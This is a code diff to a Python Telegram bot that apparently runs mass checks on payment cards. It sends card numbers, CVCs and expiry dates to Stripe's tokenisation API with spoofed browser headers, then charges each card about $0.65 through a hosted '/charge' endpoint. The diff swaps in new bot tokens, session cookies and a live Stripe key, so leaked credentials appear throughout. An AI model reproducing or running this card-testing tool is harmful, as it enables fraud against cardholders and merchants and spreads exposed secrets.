@@ -5,7 +5,7 @@ from telebot import types
 import time
 import json
 
-bot = telebot.TeleBot("7179367206:AAGauAuI4MQCZgLymvn3E2iU1r8ZJOHj-Yo")
+bot = telebot.TeleBot("8015260607:AAFvv64n4eILq2kGHiNE4zpKe5eQzbxSDPs")
 
 def get_bin_info(bin_number):
     try:
@@ -26,7 +26,7 @@ def create_card_token(card_number, exp_month, exp_year, cvc):
     headers = {
         'authority': 'api.stripe.com',
         'accept': 'application/json',
-        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,ar;q=0.6',
         'content-type': 'application/x-www-form-urlencoded',
         'origin': 'https://js.stripe.com',
         'referer': 'https://js.stripe.com/',
@@ -41,15 +41,15 @@ def create_card_token(card_number, exp_month, exp_year, cvc):
     
     data = {
         'guid': 'fe5d9216-ca1c-4486-bd2a-d786fbb9ed88607e7e',
-        'muid': '1c26bb28-5960-47ed-8cec-b12c8ff21114fd6e0e',
-        'sid': '2d1ff066-bcb4-47c1-948d-71ac0ab28cfa8c6c6e',
-        'referrer': 'https://node-stripe-ncnb.onrender.com',
-        'time_on_page': '17821',
+        'muid': '80094856-65f3-43c0-9a49-8c731666698c0ec4c7',
+        'sid': '67291b1b-a488-4c97-a195-612005e0ee71a7d80e',
+        'referrer': 'https://sk-charge-api.onrender.com',
+        'time_on_page': '19779',
         'card[number]': card_number,
         'card[cvc]': cvc,
         'card[exp_month]': exp_month,
         'card[exp_year]': exp_year,
-        'payment_user_agent': 'stripe.js/ee811adf1a; stripe-js-v3/ee811adf1a; split-card-element',
+        'payment_user_agent': 'stripe.js/399197339e; stripe-js-v3/399197339e; split-card-element',
         'key': 'pk_live_51OnxYlJgG6MrFYN5ZyDqREF292w7CDyawarpXxZIEHflHcfJb9KYLG4mhAHyPP5eH6M9Ax0mqPxb2Jj64xiqY3hs004AqlVUmx'
     }
     
@@ -68,12 +68,12 @@ def make_payment(token):
         return None
         
     headers = {
-        'authority': 'node-stripe-ncnb.onrender.com',
+        'authority': 'sk-charge-api.onrender.com',
         'accept': '*/*',
-        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,ar;q=0.6',
         'content-type': 'application/json',
-        'origin': 'https://node-stripe-ncnb.onrender.com',
-        'referer': 'https://node-stripe-ncnb.onrender.com/',
+        'origin': 'https://sk-charge-api.onrender.com',
+        'referer': 'https://sk-charge-api.onrender.com/',
         'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
         'sec-ch-ua-mobile': '?1',
         'sec-ch-ua-platform': '"Android"',
@@ -81,14 +81,14 @@ def make_payment(token):
         'sec-fetch-mode': 'cors',
         'sec-fetch-site': 'same-origin',
         'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-        'cookie': 'connect.sid=s%3AAG3cUFSj6RHbObNu1CQfpQhi5WN_1WEO.x3fMApq6GRbeKyfByJ1ev8oACs55Cg1XLT41KNPaN%2FU; __stripe_mid=1c26bb28-5960-47ed-8cec-b12c8ff21114fd6e0e; __stripe_sid=2d1ff066-bcb4-47c1-948d-71ac0ab28cfa8c6c6e'
+        'cookie': '__stripe_mid=80094856-65f3-43c0-9a49-8c731666698c0ec4c7; __stripe_sid=67291b1b-a488-4c97-a195-612005e0ee71a7d80e; connect.sid=s%3AFCAoVysNDDLjGFggbtmH1CnllKC4qIIi.rSlTqdaZSzfZwuz5c7K5F%2FoKc%2BtuoaZdIiLZ1E6oW8U'
     }
     
     payload = {'token': token}
     
     try:
         response = requests.post(
-            'https://node-stripe-ncnb.onrender.com/charge',
+            'https://sk-charge-api.onrender.com/charge',
             headers=headers,
             json=payload
         )
@@ -231,7 +231,7 @@ def handle_macc(message):
 𝘚𝘒 𝘔𝘈𝘚𝘚 𝘊𝘏𝘌𝘊𝘒 (𝘚𝘛𝘙𝘐𝘗E 0.65$) 
 
 𝗧𝗢𝗧𝗔𝗟 𝗖𝗔𝗥𝗗𝗦 : {len(valid_cards)}
-𝘚𝘛𝘈𝘛𝘜𝘚 : 𝘐𝘕 𝘗𝘌𝘕𝘋𝘐𝘕𝘎 𝘊𝘈𝘙𝘋𝘚 WAIT ... 
+𝘚𝘛𝘈𝘛𝘜𝘚 : 𝘐𝘕 𝘗𝘌𝘕𝘋𝘐𝘕𝘎 �𝘈𝘙𝘋𝘚 WAIT ... 
 """
         sent_msg = bot.reply_to(message, initial_msg, parse_mode='HTML')
         
